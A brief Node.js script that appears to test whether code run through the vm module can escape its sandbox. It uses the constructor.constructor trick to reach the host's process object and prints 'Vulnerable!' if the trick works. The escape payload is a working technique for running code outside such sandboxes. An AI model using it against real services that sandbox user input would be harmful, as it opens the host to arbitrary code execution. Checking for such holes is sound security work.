const vm = require('vm');
const sandbox = { orderLinesData: 'test' };
vm.createContext(sandbox);
try {
  let res = vm.runInContext('this.constructor.constructor("return process")()', sandbox);
  console.log('Vulnerable!', res);
} catch (e) {
  console.log('Error:', e.message);
}
